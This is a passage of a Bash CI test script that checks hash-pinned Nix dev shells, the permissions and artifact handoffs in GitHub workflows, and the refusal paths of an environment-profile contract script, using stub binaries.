grep -Fxq "export DIENE_NSC_BIN=$DIENE_NSC_BIN" "$setup_hook"
grep -Fxq "export DIENE_NSC_IDENTITY_FILE=$DIENE_NSC_IDENTITY_FILE" "$setup_hook"
binary_digest="sha256:$(sha256sum "$DIENE_NSC_BIN" | awk '{print $1}')"
jq -e --arg binaryDigest "$binary_digest" '
  .version == "v0.0.532" and
  .artifactDigest == "sha256:b2ec7146c72aa24c95930135259dd6ba8a25fdc4dae2fc92346286ac71bea0fc" and
  .binaryDigest == $binaryDigest
' "$DIENE_NSC_IDENTITY_FILE" >/dev/null
ASSERT_NSC
chmod 0500 "$nsc_shell_assertion"

if ! "${nix_shell_build[@]}" >/dev/null; then
  fail 'the resolved ci shell derivation could not be built offline'
fi
if ! "${nix_shell_darwin_eval[@]}" >"$scratch/ci-shell-darwin-drv"; then
  fail 'the resolved ci shell does not evaluate for aarch64-darwin'
fi
grep -Eq '^/nix/store/[a-z0-9]{32}-[^/]+\.drv$' "$scratch/ci-shell-darwin-drv" ||
  fail 'the aarch64-darwin ci shell evaluation emitted no derivation path'

# This single-quoted program is evaluated by the pure inner Bash, not here.
# shellcheck disable=SC2016
if ! HOME=$nix_shell_home "${nix_shell_develop[@]}" --command bash -ceu '
    assertion=${1:?assertion required}
    shift
    failed=0
    for command_name do
      if ! resolved=$(command -v "$command_name" 2>/dev/null); then
        printf "MISSING: %s\n" "$command_name" >&2
        failed=1
        continue
      fi
      case $resolved in
        /nix/store/*) ;;
        *)
          printf "UNOWNED: %s=%s\n" "$command_name" "$resolved" >&2
          failed=1
          continue
          ;;
      esac
      printf "%s=%s\n" "$command_name" "$resolved"
    done
    "$assertion"
    exit "$failed"
  ' bash "$nsc_shell_assertion" "${ci_shell_commands[@]}" >"$scratch/ci-shell-commands"; then
  fail 'the resolved ci shell does not own the complete production command inventory'
fi
[[ $(wc -l <"$scratch/ci-shell-commands") -eq ${#ci_shell_commands[@]} ]] ||
  fail 'the resolved ci shell command inventory was incomplete'
ok "$ci_shell_success"

grep -Fq 'version = "0.0.532"' "$template_root/nix/packages.nix" ||
  fail 'the declared CI shell does not pin nsc v0.0.532'
grep -Fq 'sha256-suxxRscqokyVkwE1JZ3Wuool/cTa4vySNGKGrHG+oPw=' \
  "$template_root/nix/packages.nix" || fail 'the measured x86_64 nsc release hash is absent'
grep -Fq 'setupHook = pkgs-2605.writeText "diene-nsc-setup-hook"' \
  "$template_root/nix/packages.nix" || fail 'the pinned nsc setup hook is absent'
grep -Fq 'export DIENE_NSC_BIN=@out@/bin/nsc' "$template_root/nix/packages.nix" ||
  fail 'the nsc setup hook does not bind the immutable store executable'
grep -Fq 'export DIENE_NSC_IDENTITY_FILE=@out@/share/diene/nsc-identity.json' \
  "$template_root/nix/packages.nix" || fail 'the nsc setup hook does not bind its identity record'
if rg -n 'inherit[[:space:]]+nsc|^[[:space:]]+nsc$' "$template_root/nix/packages.nix" \
  >"$scratch/inherited-nsc"; then
  sed -n '1,80p' "$scratch/inherited-nsc" >&2
  fail 'packages.nix still permits the channel nsc to replace the measured assignment'
fi
ok 'every declared shell selects the hash-pinned measured Namespace CLI through its setup hook'

source_template_root=$(cd -- "$template_root/../.." && pwd)
generated_fixture_root=$source_template_root/cyan/fixtures/expected
if [[ -f $source_template_root/cyan.yaml && -d $generated_fixture_root &&
  $template_root -ef $source_template_root/templates/base ]]; then
  [[ -n ${ci_shell_composition:-} ]] ||
    fail 'the source fixture proof requires the real flake-less composition expression'
  generated_fixture_count=0
  for fixture_root in "$generated_fixture_root"/*; do
    [[ -d $fixture_root ]] || continue
    for nix_file in env.nix packages.nix shells.nix; do
      [[ -f $fixture_root/nix/$nix_file ]] ||
        fail "generated fixture ${fixture_root##*/} lost nix/$nix_file"
    done
    [[ $(rg -c '^[[:space:]]+(default|ci|cd|releaser) = pkgs\.mkShell \{' \
      "$fixture_root/nix/shells.nix") -eq 4 ]] ||
      fail "generated fixture ${fixture_root##*/} lost one of the four shells"
    [[ $(rg -c 'pkgs\.lib\.optionals pkgs\.stdenv\.hostPlatform\.isLinux mainLinux' \
      "$fixture_root/nix/shells.nix") -eq 4 ]] ||
      fail "generated fixture ${fixture_root##*/} lost Linux-only inputs from a shell"

    fixture_composition_args=(
      --argstr templateRoot "$fixture_root"
      --argstr nixpkgsSource "$nixpkgs_source"
      --argstr atomipkgsSource "$atomipkgs_source"
    )
    if ! fixture_linux_proof=$(nix eval --offline --impure --json \
      --file "$ci_shell_composition" "${fixture_composition_args[@]}" \
      --argstr system x86_64-linux proof); then
      fail "generated fixture ${fixture_root##*/} does not evaluate on x86_64-linux"
    fi
    if ! fixture_darwin_proof=$(nix eval --offline --impure --json \
      --file "$ci_shell_composition" "${fixture_composition_args[@]}" \
      --argstr system aarch64-darwin proof); then
      fail "generated fixture ${fixture_root##*/} does not evaluate on aarch64-darwin"
    fi
    validate_shell_proof "generated fixture ${fixture_root##*/}" x86_64-linux true \
      "$fixture_linux_proof"
    validate_shell_proof "generated fixture ${fixture_root##*/}" aarch64-darwin true \
      "$fixture_darwin_proof"

    for shell_name in default ci cd releaser; do
      HOME=$nix_shell_home \
        nix develop --offline --impure --ignore-environment --keep-env-var HOME \
        --file "$ci_shell_composition" "${fixture_composition_args[@]}" \
        --argstr system x86_64-linux "$shell_name" --command "$nsc_shell_assertion" ||
        fail "generated fixture ${fixture_root##*/} shell $shell_name lost its exact runtime inputs"
    done
    generated_fixture_count=$((generated_fixture_count + 1))
  done
  [[ $generated_fixture_count -eq 9 ]] ||
    fail "expected nine generated fixture proofs, got $generated_fixture_count"
  ok 'all nine generated shapes preserve Linux/Darwin parity, four shells, and pinned nsc identity'
else
  ok 'the consumer shell preserves Linux/Darwin parity, four shells, and pinned nsc identity'
fi

for input in lane repository_id repository_key source_sha garden_lock_digest artifact_digest \
  artifact_provenance_ref artifact_attestation_digest journey_manifest vendor_manifest action_id \
  closure_digest closure_bundle_ref closure_signature_bundle_digest closure_trust_root_digest; do
  grep -Eq "^      ${input}:" "$workflow" || fail "workflow_call input $input is absent"
done
for output in subject_digest receipt_id core_report_digest vendor_report_digest; do
  grep -Eq "^      ${output}:" "$workflow" || fail "workflow_call output $output is absent"
done
ok 'workflow_call retains the complete ratified v1 input/output vocabulary'

core_caller=$template_root/.github/workflows/environment-k3d.yaml
vendor_caller=$template_root/.github/workflows/environment-vendor.yaml
core_caller_json=$scratch/environment-k3d.json
vendor_caller_json=$scratch/environment-vendor.json
yq -o=json '.' "$core_caller" >"$core_caller_json"
yq -o=json '.' "$vendor_caller" >"$vendor_caller_json"

# The GitHub expression is intentionally matched literally.
# shellcheck disable=SC2016
artifact_handoff='diene-artifact-subject-${{ github.run_id }}-${{ github.run_attempt }}'

jq -e --arg subject "$artifact_handoff" '
  .jobs as $jobs |
  {"environment-ditto-build-local":{"contents":"read","id-token":"write"},
   "environment-ditto-target-pull":{"contents":"read","packages":"read","id-token":"write"},
   "environment-absol":{"contents":"read","id-token":"write"},
   "environment-fleet-independence":{"contents":"read"}} as $runtimePermissions |
  (.on | keys | sort) == ["push","schedule","workflow_dispatch"] and
  .on.schedule == [{"cron":"17 3 * * 1"}] and
  (.on.workflow_dispatch.inputs | keys | sort) == ["release_candidate","source_sha"] and
  .permissions == {} and
  (["authorize-runtime","artifact-build","environment-profile-contract"] |
    all(. as $id | $jobs[$id]["runs-on"] == "ubuntu-26.04")) and
  ([ $jobs[] | select(.["runs-on"] == "ubuntu-26.04") ] | length) == 3 and
  $jobs["authorize-runtime"].permissions == {"contents":"read"} and
  $jobs["artifact-build"].needs == "authorize-runtime" and
  $jobs["artifact-build"].permissions ==
    {"contents":"read","packages":"write","id-token":"write"} and
  $jobs["environment-profile-contract"].needs == ["authorize-runtime","artifact-build"] and
  $jobs["environment-profile-contract"].permissions == {"contents":"read"} and
  (["environment-ditto-build-local","environment-ditto-target-pull","environment-absol",
    "environment-fleet-independence"] |
    all(. as $id |
      $jobs[$id].needs == ["authorize-runtime","artifact-build","environment-profile-contract"] and
      $jobs[$id].permissions == $runtimePermissions[$id] and
      $jobs[$id].uses == "./.github/workflows/⚡reusable-environment-k3d.yaml" and
      $jobs[$id].with.journey_manifest == ".diene/ci/journeys.v1.yaml" and
      ($jobs[$id].with | has("vendor_manifest") | not) and
      ($jobs[$id].with | has("action_id") | not))) and
  ($jobs["environment-ditto-target-pull"].with.artifact_provenance_ref |
    contains("needs.artifact-build.outputs.artifact_provenance_ref")) and
  ($jobs["environment-ditto-target-pull"].with.artifact_attestation_digest |
    contains("needs.artifact-build.outputs.artifact_attestation_digest")) and
  (["closure_digest","closure_bundle_ref","closure_signature_bundle_digest",
    "closure_trust_root_digest"] |
    all(. as $field |
      ($jobs["environment-absol"].with[$field] |
        contains("needs.artifact-build.outputs." + $field)))) and
  ($jobs["environment-fleet-independence"].if | contains("schedule")) and
  (["environment-ditto-build-local","environment-ditto-target-pull","environment-absol"] |
    all(. as $id | ($jobs[$id].if | contains("schedule") | not))) and
  ($jobs["environment-absol"].if | contains("inputs.release_candidate == true")) and
  (["environment-ditto-build-local","environment-ditto-target-pull","environment-fleet-independence"] |
    all(. as $id | ($jobs[$id].if | contains("inputs.release_candidate == true") | not))) and
  (([ $jobs["authorize-runtime"].steps[] | .run? // empty ] | join("\n")) as $guard |
    (["=~ ^[0-9a-f]{40}$","git rev-parse --verify","git merge-base --is-ancestor",
      "GITHUB_REPOSITORY_OWNER\" = AtomiCloud","dependabot[bot]",
      "permission\" == write || \"$permission\" == admin",
      "test \"$WORKFLOW_SHA\" = \"$REQUESTED_SHA\""] |
      all(. as $needle | $guard | contains($needle)))) and
  ([ $jobs["artifact-build"].steps[] | select(
    .uses == "actions/upload-artifact@v4" and
    .with.name == $subject and .with.path == "${{ runner.temp }}/artifact.v1.json" and
    .with["if-no-files-found"] == "error" and .with["retention-days"] == 1) ] |
    length) == 1 and
  ($jobs["environment-profile-contract"] as $profile |
    ([ $profile.steps[] | select(
      .uses == "actions/download-artifact@v4" and
      .with.name == $subject and .with.path == "${{ runner.temp }}/subject") ] | length) == 1 and
    ([ $profile.steps[] | select(
      .name == "Validate runtime-free profile, corpus, and parity" and
      (.run | contains("./scripts/ci/environment-profile-contract.sh")) and
      (.run | contains("--validate") | not)) ] | length) == 1 and
    ([ $profile.steps[] | select(
      .uses == "actions/upload-artifact@v4" and .if == "always()" and
      .with.name == ($subject | sub("^diene-artifact-subject";"diene-profile-contract-runtime")) and
      .with.path == "${{ runner.temp }}/diene-profile-contract.json" and
      .with["if-no-files-found"] == "error" and .with["retention-days"] == 7) ] | length) == 1)
' "$core_caller_json" >/dev/null ||
  fail 'the core caller lost exact triggers, permissions, selectors, subject handoff, or profile wiring'

jq -e --arg subject "$artifact_handoff" '
  .jobs as $jobs |
  (.on | keys) == ["workflow_dispatch"] and
  (.on.workflow_dispatch.inputs | keys | sort) == ["action_id","source_sha"] and
  .permissions == {} and
  (["authorize-vendor","artifact-build","environment-profile-contract"] |
    all(. as $id | $jobs[$id]["runs-on"] == "ubuntu-26.04")) and
  ([ $jobs[] | select(.["runs-on"] == "ubuntu-26.04") ] | length) == 3 and
  $jobs["authorize-vendor"].permissions == {"contents":"read"} and
  $jobs["artifact-build"].needs == "authorize-vendor" and
  $jobs["artifact-build"].permissions ==
    {"contents":"read","packages":"write","id-token":"write"} and
  $jobs["environment-profile-contract"].needs == ["authorize-vendor","artifact-build"] and
  $jobs["environment-profile-contract"].permissions == {"contents":"read"} and
  ($jobs["environment-ditto-vendor"].needs ==
    ["authorize-vendor","artifact-build","environment-profile-contract"]) and
  ($jobs["environment-ditto-vendor"].permissions == {"contents":"read","id-token":"write"}) and
  ($jobs["environment-ditto-vendor"].uses == "./.github/workflows/⚡reusable-environment-k3d.yaml") and
  ($jobs["environment-ditto-vendor"].with.vendor_manifest == ".diene/ci/vendors.v1.yaml") and
  ($jobs["environment-ditto-vendor"].with.action_id == "${{ inputs.action_id }}") and
  (($jobs["environment-ditto-vendor"].with | has("journey_manifest")) | not) and
  ($jobs["environment-ditto-vendor"].secrets == "inherit") and
  (([ $jobs["authorize-vendor"].steps[] | .run? // empty ] | join("\n")) as $guard |
    (["=~ ^[0-9a-f]{40}$","git rev-parse --verify","git merge-base --is-ancestor",
      "GITHUB_REPOSITORY_OWNER\" = AtomiCloud","permission\" == write || \"$permission\" == admin",
      "test \"$WORKFLOW_SHA\" = \"$SOURCE_SHA\""] |
      all(. as $needle | $guard | contains($needle)))) and
  ([ $jobs["artifact-build"].steps[] | select(
    .uses == "actions/upload-artifact@v4" and
    .with.name == $subject and .with.path == "${{ runner.temp }}/artifact.v1.json" and
    .with["if-no-files-found"] == "error" and .with["retention-days"] == 1) ] |
    length) == 1 and
  ($jobs["environment-profile-contract"] as $profile |
    ([ $profile.steps[] | select(
      .uses == "actions/download-artifact@v4" and
      .with.name == $subject and .with.path == "${{ runner.temp }}/subject") ] | length) == 1 and
    ([ $profile.steps[] | select(
      .name == "Validate runtime-free profile, corpus, and parity" and
      (.run | contains("./scripts/ci/environment-profile-contract.sh")) and
      (.run | contains("--validate") | not)) ] | length) == 1 and
    ([ $profile.steps[] | select(
      .uses == "actions/upload-artifact@v4" and .if == "always()" and
      .with.name == ($subject | sub("^diene-artifact-subject";"diene-profile-contract-vendor")) and
      .with.path == "${{ runner.temp }}/diene-profile-contract.json" and
      .with["if-no-files-found"] == "error" and .with["retention-days"] == 7) ] | length) == 1)
' "$vendor_caller_json" >/dev/null ||
  fail 'the vendor caller lost exact dispatch, permissions, selectors, subject handoff, or profile wiring'

jq -es '
  ([.[0].jobs | to_entries[] | .value.with.lane? // empty] +
   [.[1].jobs | to_entries[] | .value.with.lane? // empty] | sort) ==
  ["absol","ditto-build-local","ditto-target-pull","ditto-vendor","fleet-independence"]
' "$core_caller_json" "$vendor_caller_json" >/dev/null ||
  fail 'the callers do not dispatch the exact five-lane set once each'

jq -e --arg subject "$artifact_handoff" '
  .jobs as $jobs |
  ["environment-ditto-build-local","environment-ditto-target-pull","environment-ditto-vendor",
   "environment-absol","environment-fleet-independence"] as $runtimeIds |
  {"environment-ditto-build-local":{"contents":"read","id-token":"write"},
   "environment-ditto-target-pull":{"contents":"read","packages":"read","id-token":"write"},
   "environment-ditto-vendor":{"contents":"read","id-token":"write"},
   "environment-absol":{"contents":"read","id-token":"write"},
   "environment-fleet-independence":{"contents":"read"}} as $runtimePermissions |
  ($subject | sub("^diene-artifact-subject-";"diene-namespace-proof-${{ inputs.lane }}-")) as $proof |
  .permissions == {} and
  $jobs.contract.permissions == {"contents":"read"} and
  ([ $jobs.contract.steps[] | select(
    .uses == "actions/download-artifact@v4" and
    .with.name == $subject and .with.path == "${{ runner.temp }}/subject") ] | length) == 1 and
  ($runtimeIds | all(. as $id |
    $jobs[$id].needs == "contract" and
    $jobs[$id].permissions == $runtimePermissions[$id] and
    ([ $jobs[$id].steps[] | select(
      .uses == "actions/download-artifact@v4" and
      .with.name == $subject and .with.path == "${{ runner.temp }}/subject") ] | length) == 1 and
    ([ $jobs[$id].steps[] | select(
      .id == "run" and .["continue-on-error"] == true and
      (.run | contains("./scripts/ci/environment-k3d-run.sh orchestrate"))) ] | length) == 1 and
    ([ $jobs[$id].steps[] | select(
      .id == "lifecycle" and .if == "always()" and
      (.run | contains("./scripts/ci/environment-k3d-run.sh cleanup"))) ] | length) == 1 and
    ([ $jobs[$id].steps[] | select(
      .uses == "actions/upload-artifact@v4" and .if == "always()" and
      .with.name == $proof and .with.path == "${{ runner.temp }}/diene-proof-bundle.tar" and
      .with["if-no-files-found"] == "error" and .with["retention-days"] == 7) ] | length) == 1 and
    ([ $jobs[$id].steps[] | select(
      .if == "always() && (steps.run.outcome != '\''success'\'' || steps.lifecycle.outcome != '\''success'\'')" and
      (.run | contains("exit 1"))) ] | length) == 1)) and
  ($jobs["environment-runner-lifecycle"] as $lifecycle |
    $lifecycle.if == "always()" and $lifecycle.permissions == {"contents":"read"} and
    $lifecycle.needs == ["contract","environment-ditto-build-local","environment-ditto-target-pull",
      "environment-ditto-vendor","environment-absol","environment-fleet-independence"] and
    ([ $lifecycle.steps[] | select(
      .uses == "actions/download-artifact@v4" and
      .with.name == $subject and .with.path == "${{ runner.temp }}/subject") ] | length) == 1 and
    ([ $lifecycle.steps[] | select(
      .uses == "actions/download-artifact@v4" and
      .with.name == $proof and .with.path == "${{ runner.temp }}/namespace-proof") ] | length) == 1 and
    ([ $lifecycle.steps[] | select(
      . as $step |
      $step.name == "Verify the exact terminal lifecycle evidence" and
      (["needs.environment-ditto-build-local.result","needs.environment-ditto-target-pull.result",
        "needs.environment-ditto-vendor.result","needs.environment-absol.result",
        "needs.environment-fleet-independence.result"] |
        all(. as $needle | $step.env.SELECTED_RUNTIME_RESULT | contains($needle))) and
      ($step.run | contains("test \"$SELECTED_RUNTIME_RESULT\" = success")) and
      ($step.run | contains("./scripts/ci/environment-k3d-run.sh lifecycle")) and
      ($step.run | contains("$RUNNER_TEMP/namespace-proof/diene-proof-bundle.tar"))) ] | length) == 1)
' "$workflow_json" >/dev/null ||
  fail 'the reusable subject, runtime proof, permissions, or lifecycle wiring changed'
ok 'caller triggers, blocking needs, permissions, selectors, handoff, trust, and lifecycle wiring are structural'

printf '== executable profile, corpus, and parity contract ==\n'

profile_pls=$scratch/profile-pls
profile_pls_log=$scratch/profile-pls.log
profile_pls_accepted_log=$scratch/profile-pls-accepted.log
cat >"$profile_pls" <<'PLS'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$*" >>"${FAKE_PLS_LOG:?}"
[[ $* != "${FAKE_PLS_FAIL_PAIR:-}" ]] || exit 7
case "$*" in
  'env switch --profile ditto --build-mode build-local' | 'env switch --profile ditto --build-mode target-pull' | 'env switch --profile absol --build-mode build-local')
    printf '%s\n' "$*" >>"${FAKE_PLS_ACCEPTED_LOG:?}"
    ;;
  'env switch --profile absol --build-mode target-pull')
    [[ ${FAKE_PLS_ACCEPT_ALL:-0} == 1 ]] || exit 64
    printf '%s\n' "$*" >>"${FAKE_PLS_ACCEPTED_LOG:?}"
    ;;
  *) exit 127 ;;
esac
PLS
chmod 0755 "$profile_pls"

profile_renderer=$scratch/profile-renderer
profile_renderer_log=$scratch/profile-renderer.log
cat >"$profile_renderer" <<'RENDER'
#!/usr/bin/env bash
set -euo pipefail
[[ ${1:-} == --profile && $# -eq 2 ]] || exit 127
profile=${2:?}
printf '%s\n' "$profile" >>"${FAKE_RENDER_LOG:?}"
[[ $profile != "${FAKE_RENDER_FAIL_PROFILE:-}" ]] || exit 65
jq -n --arg profile "$profile" --arg substrate "${FAKE_RENDER_SUBSTRATE:-k3d}" \
  '{profile:$profile,substrate:$substrate}'
RENDER
chmod 0755 "$profile_renderer"

run_profile_contract() (
  local selected_lock=${1:?lock required} selected_report=${2:?report required}
  local renderer=${3-} accept_all=${4:-0} selected_pls=${5:-$profile_pls}
  cd -- "$work"
  install -d -m 0700 "$scratch/profile-temp"
  export RUNNER_TEMP="$scratch/profile-temp"
  export DIENE_ENVIRONMENT_LOCK="$selected_lock" DIENE_PROFILE_REPORT="$selected_report"
  export DIENE_PLS_BIN="$selected_pls" DIENE_SCHEMA_DIR="$work/schemas/ci"
  export FAKE_PLS_LOG="$profile_pls_log" FAKE_PLS_ACCEPTED_LOG="$profile_pls_accepted_log"
  export FAKE_PLS_ACCEPT_ALL="$accept_all" FAKE_RENDER_LOG="$profile_renderer_log"
  export GITHUB_SHA=$SOURCE_SHA GITHUB_OUTPUT="$scratch/profile-github-output"
  if [[ -n $renderer ]]; then
    export DIENE_PROFILE_RENDER_BIN="$renderer"
  else
    unset DIENE_PROFILE_RENDER_BIN
  fi
  ./scripts/ci/environment-profile-contract.sh
)

render_profile_case() (
  local profile=${1-} renderer=${2-}
  cd -- "$work"
  install -d -m 0700 "$scratch/profile-temp"
  export RUNNER_TEMP="$scratch/profile-temp"
  export DIENE_SCHEMA_DIR="$work/schemas/ci" FAKE_RENDER_LOG="$profile_renderer_log"
  if [[ -n $renderer ]]; then
    export DIENE_PROFILE_RENDER_BIN="$renderer"
  else
    unset DIENE_PROFILE_RENDER_BIN
  fi
  ./scripts/ci/environment-profile-contract.sh --render-profile "$profile"
)

profile_validator=${DIENE_SCHEMA_VALIDATOR_BIN:-check-jsonschema}
profile_output=$scratch/profile-github-output
profile_no_lock=$scratch/profile-no-lock.json
: >"$profile_output"
: >"$profile_pls_log"
: >"$profile_pls_accepted_log"
run_profile_contract "$scratch/absent-environment-lock.json" "$profile_no_lock"
"$profile_validator" --base-uri "file://$work/schemas/ci/" \
  --schemafile "$work/schemas/ci/diene-profile-report-v1.schema.json" "$profile_no_lock" >/dev/null ||
  fail 'the explicit no-lock profile report is not schema-valid'
jq -e '
  .outcome == "NotApplicable" and .reasonCode == "NoDeclaration" and
  .renderedProfiles == [] and .validatedProfiles == [] and
  ([.staticContract[] | .outcome] | length == 6 and all(. == "NotApplicable"))
' "$profile_no_lock" >/dev/null || fail 'an absent environment lock implied profile coverage'
grep -Fxq "profile_report=$profile_no_lock" "$profile_output" ||
  fail 'the no-lock profile report path was not published through GITHUB_OUTPUT'
[[ ! -s $profile_pls_log ]] || fail 'an absent environment lock invoked pls'
ok 'an absent environment lock is explicit schema-valid NotApplicable/NoDeclaration'

profile_lock_directory=$scratch/profile-lock-directory
install -d -m 0700 "$profile_lock_directory"
: >"$profile_pls_log"
expect_refusal_message InputContractInvalid 'environment lock must be a regular file' \
  run_profile_contract "$profile_lock_directory" "$scratch/profile-lock-directory-report.json"
[[ ! -e $scratch/profile-lock-directory-report.json ]] ||
  fail 'a directory environment lock published a profile report'
profile_invalid_lock=$scratch/profile-invalid-lock.json
printf '{invalid json\n' >"$profile_invalid_lock"
expect_refusal_message PreviewManifestSchemaMismatch 'environment lock is not valid JSON' \
  run_profile_contract "$profile_invalid_lock" "$scratch/profile-invalid-lock-report.json"
[[ ! -e $scratch/profile-invalid-lock-report.json ]] ||
  fail 'an invalid-JSON environment lock published a profile report'
[[ ! -s $profile_pls_log ]] || fail 'an invalid environment lock reached pls env switch'
ok 'directory and invalid-JSON lock paths refuse cleanly before pls or report emission'

profile_deferred=$scratch/profile-deferred.json
: >"$profile_output"
: >"$profile_pls_log"
: >"$profile_pls_accepted_log"
expect_refusal_message ProfileRenderInterfaceUnavailable \
  'no ratified runtime-free executable render; set DIENE_PROFILE_RENDER_BIN once Garden publishes one' \
  run_profile_contract \
  "$work/.diene/ci/environment-lock.v1.json" "$profile_deferred"
"$profile_validator" --base-uri "file://$work/schemas/ci/" \
  --schemafile "$work/schemas/ci/diene-profile-report-v1.schema.json" "$profile_deferred" >/dev/null ||
  fail 'the deliberately unavailable renderer report is not schema-valid'
jq -e '
  .outcome == "Fail" and .reasonCode == "ProfileRenderInterfaceUnavailable" and
  ([.staticContract[] | .outcome] | length == 6 and all(. == "Pass")) and
  .staticContract.profileSet.reasonCode == "ExactSixNameSet" and
  .staticContract.substrateParity.reasonCode == "LocalK3dHostedVcluster" and
  .staticContract.retiredNames.reasonCode == "NoRetiredIdentity" and
  .staticContract.consumerPinAliases.reasonCode == "NoAliasFound" and
  .staticContract.oneWriter.reasonCode == "SingleWriterPerObject" and
  .staticContract.buildModeMatrix.reasonCode == "ProfileModePairsValidated" and
  .castformExecutable == {outcome:"Unavailable",reasonCode:"PreviewIdentityUnavailable"} and
  .eeveeExecutable == {outcome:"Unavailable",reasonCode:"PreviewIdentityUnavailable"} and
  .localExecutableRender == {outcome:"Unavailable",reasonCode:"ProfileRenderInterfaceUnavailable"}
' "$profile_deferred" >/dev/null || fail 'the deferred profile rows lost their stable unavailable reasons'
expected_profile_switches=$'env switch --profile ditto --build-mode build-local\nenv switch --profile ditto --build-mode target-pull\nenv switch --profile absol --build-mode build-local'
[[ $(<"$profile_pls_accepted_log") == "$expected_profile_switches" ]] ||
  fail 'the profile gate accepted a pls env switch outside the exact three-pair set'
if ! { [[ $(wc -l <"$profile_pls_log") == 4 ]] &&
  tail -n 1 "$profile_pls_log" | grep -Fxq \
    'env switch --profile absol --build-mode target-pull'; }; then
  fail 'the profile gate did not explicitly test and reject Absol target-pull'
fi
if grep -Eqv '^env switch --profile (ditto|absol) --build-mode (build-local|target-pull)$' \
  "$profile_pls_log"; then
  fail 'the profile gate invoked a pls verb outside env switch'
fi
ok 'the exact three allowed pls env switches pass and Absol target-pull is actively refused'

profile_mutation=$scratch/profile-lock-mutation.json
: >"$profile_pls_log"
: >"$profile_pls_accepted_log"
jq 'del(.profiles.rotom)' "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'profile set is not the exact six-name set' \
  run_profile_contract \
  "$profile_mutation" "$scratch/profile-five-names.json"
jq '.profiles.porygon = .profiles.rotom | del(.profiles.rotom)' \
  "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'retired profile identity porygon found' \
  run_profile_contract \
  "$profile_mutation" "$scratch/profile-porygon.json"
jq '.profiles.rotom.substrate = "entei-vcluster"' \
  "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'substrate parity mismatch' \
  run_profile_contract "$profile_mutation" "$scratch/profile-parity.json"
jq '.profiles.ditto.ref = "refs/heads/main"' "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'consumer pin alias or operator shape found' \
  run_profile_contract \
  "$profile_mutation" "$scratch/profile-alias.json"
jq '.garden = {kind:"garden",version:"1.0.0"}' \
  "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'consumer pin alias or operator shape found' \
  run_profile_contract "$profile_mutation" "$scratch/profile-operator-shape.json"
jq '.operator.commitPin = "0000000000000000000000000000000000000000"' \
  "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'consumer pin alias or operator shape found' \
  run_profile_contract "$profile_mutation" "$scratch/profile-commit-pin.json"
jq '.previewManifest.schemaVersion = "preview-manifest/v2"' \
  "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch \
  'imported preview-manifest lock entry is absent or aliased' run_profile_contract \
  "$profile_mutation" "$scratch/profile-manifest-version.json"
jq '.previewManifest.schemaDigest = "sha256:not-a-digest"' \
  "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch \
  'imported preview-manifest lock entry is absent or aliased' run_profile_contract \
  "$profile_mutation" "$scratch/profile-manifest-digest.json"
jq '.writers = [
  {soleWriter:{objects:["apps/demo"],secrets:[]}},
  {soleWriter:{objects:["apps/demo"],secrets:[]}}
]' "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'one-writer ownership is violated' \
  run_profile_contract \
  "$profile_mutation" "$scratch/profile-duplicate-writer.json"
jq '.writers = [{soleWriter:{objects:["apps/demo"],secrets:["apps/demo"]}}]' \
  "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
expect_refusal_message PreviewManifestSchemaMismatch 'one-writer ownership is violated' \
  run_profile_contract "$profile_mutation" "$scratch/profile-writer-overlap.json"
[[ ! -s $profile_pls_log ]] || fail 'a static corpus refusal reached pls env switch'
ok 'every distinct static corpus gate refuses with its exact message before pls'

jq '.writers = [
  {soleWriter:{objects:["apps/demo"],secrets:["secret/demo"]}},
  {soleWriter:{objects:["apps/other"],secrets:["secret/other"]}}
]' "$work/.diene/ci/environment-lock.v1.json" >"$profile_mutation"
: >"$profile_pls_log"
: >"$profile_pls_accepted_log"
expect_refusal_message ProfileRenderInterfaceUnavailable \
  'no ratified runtime-free executable render; set DIENE_PROFILE_RENDER_BIN once Garden publishes one' \
  run_profile_contract "$profile_mutation" "$scratch/profile-distinct-writers.json"
[[ -e $scratch/profile-distinct-writers.json ]] ||
  fail 'distinct sole writers did not pass the one-writer gate and reach report emission'
ok 'distinct sole writers pass the static gate and reach the deferred renderer report'

: >"$profile_pls_log"
: >"$profile_pls_accepted_log"
expect_refusal_message PreviewManifestSchemaMismatch \
  'Absol accepted a non closure-backed build mode' run_profile_contract \
  "$work/.diene/ci/environment-lock.v1.json" "$scratch/profile-bad-mode.json" '' 1
[[ ! -e $scratch/profile-bad-mode.json ]] ||
  fail 'a refused bad-mode corpus published a report'

profile_missing_pls=$scratch/profile-missing-pls
expect_refusal_message DependencyUnavailable "$profile_missing_pls is required" \
  run_profile_contract "$work/.diene/ci/environment-lock.v1.json" \
  "$scratch/profile-missing-pls-report.json" '' 0 "$profile_missing_pls"
[[ ! -e $scratch/profile-missing-pls-report.json ]] ||
  fail 'a missing pls binary published a profile report'

: >"$profile_pls_log"
export FAKE_PLS_FAIL_PAIR='env switch --profile ditto --build-mode target-pull'
expect_refusal_message PreviewManifestSchemaMismatch \
  'Ditto target-pull profile/mode pair was refused' run_profile_contract \
  "$work/.diene/ci/environment-lock.v1.json" "$scratch/profile-pls-rejected.json"
unset FAKE_PLS_FAIL_PAIR
[[ ! -e $scratch/profile-pls-rejected.json ]] ||
  fail 'a refused ratified pls pair published a profile report'
ok 'permissive bad mode, missing pls, and a refused ratified pair all fail with stable evidence and no report'

for hosted_profile in castform eevee; do
  expect_refusal_message PreviewIdentityUnavailable \
    "$hosted_profile executable rendering is outside this node" \
    render_profile_case "$hosted_profile"
  expect_refusal_message PreviewIdentityUnavailable \
    "$hosted_profile executable rendering is outside this node" \
    render_profile_case "$hosted_profile" "$profile_renderer"
done
